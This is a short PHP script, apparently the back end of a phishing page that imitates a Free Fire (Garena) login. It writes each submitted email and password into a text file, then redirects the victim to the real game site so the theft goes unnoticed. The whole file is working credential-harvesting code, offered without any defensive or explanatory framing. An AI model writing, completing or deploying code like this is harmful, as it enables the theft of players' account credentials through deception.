<?php
file_put_contents("usernames.txt", "FF Username: " . $email = $_POST['email'] ."\nPassword: ". $pass = $_POST['pass'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://ff.garena.com/
header("Location: $url");
?>